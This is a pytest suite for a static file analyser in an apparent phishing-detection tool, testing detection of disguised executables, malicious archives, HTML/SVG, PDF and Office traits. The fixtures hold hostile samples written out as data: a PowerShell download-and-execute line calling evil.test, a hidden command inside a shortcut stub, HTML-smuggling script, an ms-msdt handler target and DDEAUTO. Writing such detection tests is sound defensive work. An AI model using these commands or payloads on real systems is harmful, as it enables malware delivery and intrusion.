"""Static file analysis tests. All fixtures are synthetic, inert byte stubs."""

from __future__ import annotations

import base64
import io
import struct
import zipfile

import pytest

from uniphish.core.mitre import CATALOG
from uniphish.files import INDICATOR_CATALOG, _archive, _office, analyze_file, sniff
from uniphish.files._common import Findings


def codes(a) -> set[str]:
    return {i.code for i in a.indicators}


def pe_stub(pad: int = 64) -> bytes:
    hdr = bytearray(b"MZ" + b"\x00" * 62)
    hdr[0x3C:0x40] = struct.pack("<I", 0x40)
    return bytes(hdr) + b"PE\x00\x00" + b"\x00" * pad


def _noise(n: int) -> bytes:
    import hashlib

    out = b""
    i = 0
    while len(out) < n:
        out += hashlib.sha256(str(i).encode()).digest()
        i += 1
    return out[:n]


def make_zip(entries: dict[str, bytes], *, encrypt_flag: bool = False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
    data = buf.getvalue()
    if encrypt_flag:
        # Set the 'encrypted' general-purpose bit in every local + central header (inert stub).
        b = bytearray(data)
        for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            i = 0
            while (i := b.find(sig, i)) >= 0:
                b[i + off] |= 0x01
                i += 4
        data = bytes(b)
    return data


# ----------------------------------------------------------------- sniffing / names
def test_sniff_types():
    assert sniff(pe_stub()).detected_type == "pe"
    assert sniff(b"\x7fELF" + b"\x00" * 60).detected_type == "elf"
    assert sniff(b"%PDF-1.7\n").detected_type == "pdf"
    assert sniff(b"\x89PNG\r\n\x1a\n" + b"\0" * 20).detected_type == "png"
    assert sniff(b"<!DOCTYPE html><html><body>x</body></html>").detected_type == "html"
    svg = b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>'
    assert sniff(svg).detected_type == "svg"
    assert sniff(b"hello world, plain text").detected_type == "text"
    assert sniff(b"").detected_type == "empty"
    assert sniff(bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\0" * 40
                 ).detected_type == "lnk"
    assert sniff(b"MZ is just text here, not an exe").detected_type == "text"


def test_hashes_entropy_size():
    f = sniff(b"A" * 100)
    assert f.size == 100 and len(f.sha256) == 64 and len(f.sha1) == 40 and len(f.md5) == 32
    assert f.entropy == 0.0
    assert sniff(bytes(range(256)) * 4).entropy == pytest.approx(8.0)


def test_extension_mismatch_and_disguised_executable():
    a = analyze_file(pe_stub(), "invoice.pdf")
    assert a.facts.ext_mismatch and "file.disguised_executable" in codes(a)
    assert "file.type.executable" in codes(a)
    ok = analyze_file(pe_stub(), "setup.exe")
    assert not ok.facts.ext_mismatch and "file.disguised_executable" not in codes(ok)
    html_as_pdf = analyze_file(b"<html><body>hi</body></html>", "statement.pdf")
    assert html_as_pdf.facts.ext_mismatch and "file.ext_mismatch" in codes(html_as_pdf)
    assert not sniff(b"plain notes", "notes.txt").ext_mismatch
    assert sniff(b"just text", "report.pdf").ext_mismatch
    assert not sniff(b"%PDF-1.4", "a.PDF").ext_mismatch


def test_double_extension():
    a = analyze_file(pe_stub(), "invoice.pdf.exe")
    assert a.facts.double_extension and "file.double_extension" in codes(a)
    assert analyze_file(pe_stub(), "invoice.pdf          .exe").facts.double_extension
    assert not sniff(pe_stub(), "my.report.v2.exe").double_extension
    assert not sniff(pe_stub(), "setup.exe").double_extension


def test_rtlo():
    name = "invoice\u202egpj.exe"
    a = analyze_file(pe_stub(), name)
    assert a.facts.rtlo_in_name and "file.rtlo_filename" in codes(a)
    assert a.facts.declared_ext == "exe"
    assert not sniff(b"x", "plain.txt").rtlo_in_name


# ----------------------------------------------------------------- archives
def test_zip_encrypted_nested_traversal():
    inner = make_zip({"a.txt": b"hi"})
    z = make_zip({"../../evil.txt": b"x", "nested.zip": inner, "readme.txt": b"r"},
                 encrypt_flag=True)
    a = analyze_file(z, "docs.zip")
    c = codes(a)
    assert {"file.archive.encrypted", "file.archive.nested", "file.archive.path_traversal"} <= c
    assert a.facts.detected_type == "zip"


def test_zip_single_payload_and_disguised_entry():
    a = analyze_file(make_zip({"Invoice.pdf.lnk": b"stub"}), "x.zip")
    assert {"file.archive.single_payload", "file.archive.disguised_entry"} <= codes(a)
    many = analyze_file(make_zip({"a.txt": b"1", "run.bat": b"2"}), "x.zip")
    assert "file.archive.executable_entry" in codes(many)
    assert "file.archive.single_payload" not in codes(many)


def test_zip_benign_has_no_indicators():
    a = analyze_file(make_zip({"a.txt": b"1", "b.csv": b"2"}), "data.zip")
    assert a.indicators == []


def test_zip_malformed_and_too_many():
    a = analyze_file(b"PK\x03\x04" + b"junk" * 20, "x.zip")
    assert "file.archive.malformed" in codes(a)
    # EOCD claiming 60000 entries is refused without parsing.
    eocd = b"PK\x05\x06" + struct.pack("<HHHHIIH", 0, 0, 60000, 60000, 0, 0, 0)
    a = analyze_file(b"PK\x03\x04" + b"\0" * 26 + eocd, "x.zip")
    assert "file.archive.too_many_entries" in codes(a)


def test_zip_bomb_declared_only():
    lst = _archive.ZipListing(ok=True, entries=[
        _archive.ZipEntry("big.bin", 3 << 30, 10_000, False, False)])
    f = Findings()
    _archive.analyze_zip(lst, f)
    assert f.has("file.archive.bomb")


def test_traversal_helper():
    assert _archive.is_traversal("../x") and _archive.is_traversal("a\\..\\b")
    assert _archive.is_traversal("/etc/x") and _archive.is_traversal("C:\\x")
    assert not _archive.is_traversal("dir/file..txt")


# ----------------------------------------------------------------- HTML / SVG
def test_html_smuggling_base64_magic():
    blob = base64.b64encode(pe_stub(pad=2000)).decode()
    html = (f"<html><script>var d='{blob}';var b=new Blob([atob(d)]);"
            "var a=document.createElement('a');a.href=URL.createObjectURL(b);"
            "a.download='doc.exe';a.click();</script></html>")
    a = analyze_file(html.encode(), "view.html")
    c = codes(a)
    assert "file.html.smuggling.payload" in c and "file.html.smuggling.pattern" in c
    assert "file.type.html_attachment" in c


def test_html_blob_zip_magic_and_benign_image_blob():
    zblob = base64.b64encode(make_zip({"a.txt": _noise(3000)})).decode()
    z = analyze_file(f"<script>var d='{zblob}'</script>".encode(), "a.html")
    assert "file.html.smuggling.payload" in codes(z)
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"\0" * 3000).decode()
    p = analyze_file(f'<img src="data:image/png;base64,{png}">'.encode(), "a.html")
    assert "file.html.smuggling.payload" not in codes(p)


def test_html_credential_form_and_urls():
    html = ('<html><meta http-equiv="refresh" content="0;url=https://go.example.test/x">'
            '<form action="https://collect.example.test/post"><input type="password" name="p">'
            '</form><a href="https://link.example.test/a">x</a>'
            '<a href="http://www.w3.org/1999/xhtml">ns</a></html>')
    a = analyze_file(html.encode(), "login.html")
    assert {"file.html.password_form", "file.html.external_form_action",
            "file.html.meta_refresh"} <= codes(a)
    assert "https://collect.example.test/post" in a.child_urls
    assert "https://link.example.test/a" in a.child_urls
    assert "https://go.example.test/x" in a.child_urls
    assert not any("w3.org" in u for u in a.child_urls)


def test_html_data_uri_navigation():
    a = analyze_file(b'<a href="data:text/html;base64,PGgxPmhpPC9oMT4=">x</a>', "a.html")
    assert "file.html.data_uri_navigation" in codes(a)


SVG_BAD = b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="x()">
<image xlink:href="https://img.example.test/logo.png"/>
<a xlink:href="https://login.example.test/verify"><rect width="9" height="9"/></a>
<foreignObject><div>hi</div></foreignObject>
<script>window.location = "https://redir.example.test/a";</script></svg>"""


def test_svg_script_external_image():
    a = analyze_file(SVG_BAD, "doc.svg")
    assert a.facts.detected_type == "svg"
    assert {"file.svg.script", "file.svg.foreign_object", "file.svg.external_ref",
            "file.svg.external_link", "file.svg.event_handler", "file.svg.redirect"} <= codes(a)
    for u in ("https://img.example.test/logo.png", "https://login.example.test/verify",
              "https://redir.example.test/a"):
        assert u in a.child_urls
    assert not any("w3.org" in u for u in a.child_urls)


def test_svg_clean_and_entity_bomb():
    clean = b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>'
    assert analyze_file(clean, "i.svg").indicators == []
    bomb = (b'<?xml version="1.0"?><!DOCTYPE s [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]>'
            b'<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>')
    a = analyze_file(bomb, "i.svg")
    assert "file.svg.xml_entities" in codes(a)


def test_svg_malformed_falls_back():
    a = analyze_file(b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</svg', "i.svg")
    assert "file.svg.script" in codes(a) and any("well-formed" in n for n in a.notes)


# ----------------------------------------------------------------- PDF
def test_pdf_openaction_uri():
    pdf = (b"%PDF-1.7\n1 0 obj<</OpenAction 2 0 R>>endobj\n"
           b"2 0 obj<</S/URI/URI(https://pay.example.test/now)>>endobj\n")
    a = analyze_file(pdf, "inv.pdf")
    assert {"file.pdf.open_action", "file.pdf.uri"} <= codes(a)
    assert a.child_urls == ["https://pay.example.test/now"]
    assert "file.pdf.javascript" not in codes(a)


def test_pdf_js_launch_and_escaped_names():
    pdf = b"%PDF-1.4\n<</S/#4aavaScript/JS(app.alert(1))>> <</S/Launch>>"
    a = analyze_file(pdf, "x.pdf")
    assert {"file.pdf.javascript", "file.pdf.launch", "file.pdf.obfuscated_names"} <= codes(a)


def test_pdf_hidden_in_flate_stream():
    import zlib

    body = zlib.compress(b"<</OpenAction 1 0 R/S/JavaScript/JS(x)>>")
    pdf = b"%PDF-1.5\n<</Type/ObjStm/Filter/FlateDecode>>\nstream\n" + body + b"\nendstream\n"
    assert "file.pdf.javascript" in codes(analyze_file(pdf, "x.pdf"))


def test_pdf_clean():
    assert analyze_file(b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n", "x.pdf").indicators == []


# ----------------------------------------------------------------- Office
def ooxml(extra: dict[str, bytes]) -> bytes:
    base = {"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:document/>"}
    base.update(extra)
    return make_zip(base)


def rels(target: str, rtype: str, mode: str = "External") -> bytes:
    return (f'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f'<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            f'relationships/{rtype}" Target="{target}" TargetMode="{mode}"/></Relationships>'
            ).encode()


def test_ooxml_remote_template():
    d = ooxml({"word/_rels/settings.xml.rels":
               rels("https://tpl.example.test/t.dotm", "attachedTemplate")})
    a = analyze_file(d, "r.docx")
    assert a.facts.detected_type == "ooxml" and not a.facts.ext_mismatch
    assert "file.office.remote_template" in codes(a)
    assert "https://tpl.example.test/t.dotm" in a.child_urls


def test_ooxml_hyperlink_is_not_template_and_protocol_handler():
    d = ooxml({"word/_rels/document.xml.rels": rels("https://a.example.test/", "hyperlink")})
    a = analyze_file(d, "r.docx")
    assert codes(a) == set() and a.child_urls == ["https://a.example.test/"]
    h = ooxml({"word/_rels/document.xml.rels":
               rels("ms-msdt:/id PCWDiagnostic /skip force", "oleObject")})
    assert "file.office.protocol_handler" in codes(analyze_file(h, "r.docx"))


def test_ooxml_dde_macro_xlm_embedding():
    dde = ooxml({"word/document.xml":
                 b'<w:p><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\x "a" </w:instrText>'
                 b'</w:r></w:p>'})
    assert "file.office.dde" in codes(analyze_file(dde, "a.docx"))
    m = ooxml({"word/vbaProject.bin": b"\x00" * 64, "word/embeddings/oleObject1.bin": b"x"})
    c = codes(analyze_file(m, "a.docm"))
    assert {"file.office.macro", "file.office.embedded_object"} <= c
    x = make_zip({"[Content_Types].xml": b"<Types/>", "xl/workbook.xml": b"<x/>",
                  "xl/macrosheets/sheet1.xml": b"<x/>"})
    assert "file.office.xlm_macro" in codes(analyze_file(x, "a.xlsx"))


def test_ooxml_rel_xml_entities_are_refused():
    evil = (b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x">]><Relationships>'
            b'<Relationship Type="t/oleObject" Target="&a;" TargetMode="External"/>'
            b'</Relationships>')
    a = analyze_file(ooxml({"word/_rels/document.xml.rels": evil}), "a.docx")
    assert "file.office.external_object" not in codes(a)


def test_zip_with_docx_extension_is_mismatch():
    assert sniff(make_zip({"a.txt": b"x"}), "a.docx").ext_mismatch


class FakeVBA:
    def __init__(self, has=True):
        self.has = has

    def detect_vba_macros(self):
        return self.has

    def analyze_macros(self, show_decoded_strings=False):
        return [("AutoExec", "Document_Open", "runs on open"),
                ("Suspicious", "CreateObject", "x"), ("Suspicious", "Shell", "y"),
                ("IOC", "https://c2.example.test/p", "URL")]

    def extract_macros(self):
        yield ("f", "s", "m", 'x = "https://stage.example.test/a"')

    def detect_xlm_macros(self):
        return False


def test_apply_olevba_with_standin_parser():
    f = Findings()
    assert _office.apply_olevba(FakeVBA(), f)
    assert {"file.office.macro", "file.office.autoexec", "file.office.suspicious_keywords"} <= {
        i.code for i in f.indicators}
    assert "https://c2.example.test/p" in f.urls and "https://stage.example.test/a" in f.urls
    g = Findings()
    assert not _office.apply_olevba(FakeVBA(False), g) and not g.indicators


def build_cfb() -> bytes:
    """Minimal CFB with Macros/VBA/dir storages (header cutoff 0 => regular sectors).

    Synthetic, inert stub: the 'dir' stream is zeros, not a real VBA project.
    """
    SEC = 512
    names = ["Root Entry", "Macros", "VBA", "dir"]
    types = [5, 1, 1, 2]
    child = [1, 2, 3, 0xFFFFFFFF]
    stream_sectors = 8
    ents = bytearray()
    for i, n in enumerate(names):
        raw = n.encode("utf-16-le")
        e = bytearray(128)
        e[0:len(raw)] = raw
        struct.pack_into("<H", e, 64, len(raw) + 2)
        e[66] = types[i]
        e[67] = 1
        struct.pack_into("<III", e, 68, 0xFFFFFFFF, 0xFFFFFFFF, child[i])
        if types[i] == 2:
            struct.pack_into("<I", e, 116, 2)
            struct.pack_into("<Q", e, 120, stream_sectors * SEC)
        else:
            struct.pack_into("<I", e, 116, 0xFFFFFFFE)
        ents += e
    ents = bytes(ents).ljust(SEC, b"\x00")
    fat = [0xFFFFFFFD, 0xFFFFFFFE] + list(range(3, 2 + stream_sectors)) + [0xFFFFFFFE]
    fat_b = struct.pack(f"<{len(fat)}I", *fat).ljust(SEC, b"\xff")
    hdr = bytearray(SEC)
    hdr[0:8] = bytes.fromhex("d0cf11e0a1b11ae1")
    struct.pack_into("<HHHHH", hdr, 24, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<I", hdr, 44, 1)           # FAT sectors
    struct.pack_into("<I", hdr, 48, 1)           # first dir sector
    struct.pack_into("<I", hdr, 56, 0)           # mini stream cutoff = 0
    struct.pack_into("<I", hdr, 60, 0xFFFFFFFE)  # no mini FAT
    struct.pack_into("<I", hdr, 68, 0xFFFFFFFE)  # no DIFAT
    struct.pack_into("<I", hdr, 76, 0)           # DIFAT[0] -> FAT at sector 0
    for k in range(1, 109):
        struct.pack_into("<I", hdr, 76 + 4 * k, 0xFFFFFFFF)
    return bytes(hdr) + fat_b + bytes(ents) + b"\x00" * (stream_sectors * SEC)


def test_ole_macro_storage_detected_via_olefile():
    cfb = build_cfb()
    a = analyze_file(cfb, "old.doc")
    assert a.facts.detected_type == "ole" and not a.facts.ext_mismatch
    c = codes(a)
    if "file.office.macro" not in c:  # pragma: no cover - helps diagnose fixture problems
        pytest.skip(f"synthetic CFB not parsed by olefile; notes={a.notes}")
    assert "file.office.macro" in c


def test_ole_garbage_degrades_gracefully():
    a = analyze_file(bytes.fromhex("d0cf11e0a1b11ae1") + b"\x00" * 600, "old.doc")
    assert a.facts.detected_type == "ole" and a.notes  # unreadable container noted, no crash


# ----------------------------------------------------------------- scripts, lnk, misc
def test_script_and_lnk_commands():
    ps = b'powershell -w hidden -c "iwr hxxp://evil.test/a.ps1 | iex"\nhttps://drop.example.test/p'
    a = analyze_file(ps, "update.ps1")
    assert {"file.type.script", "file.script.suspicious_commands"} <= codes(a)
    assert "https://drop.example.test/p" in a.child_urls
    lnk = (bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\0" * 20
           + "cmd.exe /c powershell -nop -w hidden iwr https://l.example.test/x".encode("utf-16-le"))
    b = analyze_file(lnk, "Scan.pdf.lnk")
    assert {"file.type.shortcut", "file.lnk.command", "file.double_extension"} <= codes(b)
    assert "https://l.example.test/x" in b.child_urls


def test_disk_image_and_onenote_and_text_urls():
    iso = b"\x00" * 0x8001 + b"CD001" + b"\x00" * 100
    assert "file.type.disk_image" in codes(analyze_file(iso, "scan.iso"))
    one = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3") + b"\0" * 50
    assert "file.type.onenote" in codes(analyze_file(one, "n.one"))
    t = analyze_file(b"pay at https://pay.example.test/x now", "n.txt")
    assert t.child_urls == ["https://pay.example.test/x"] and t.indicators == []


def test_never_raises_on_garbage():
    import os

    for blob in (b"", b"\x00", os.urandom(5000), b"PK\x03\x04", b"%PDF-", b"<svg", b"MZ" * 40):
        for name in (None, "a.zip", "a.docx", "a.svg", "a.pdf", "a.exe"):
            analyze_file(blob, name).to_dict()


def test_catalog_consistency():
    for code, (title, weight, mitre) in INDICATOR_CATALOG.items():
        assert code.startswith("file.") and len(title) <= 70, code
        assert -4 <= weight <= 8
        for m in mitre:
            assert m in CATALOG, (code, m)


def test_as_tuples_shape():
    a = analyze_file(pe_stub(), "invoice.pdf.exe")
    for code, detail, weight in a.as_tuples():
        assert code in INDICATOR_CATALOG and detail and isinstance(weight, float)
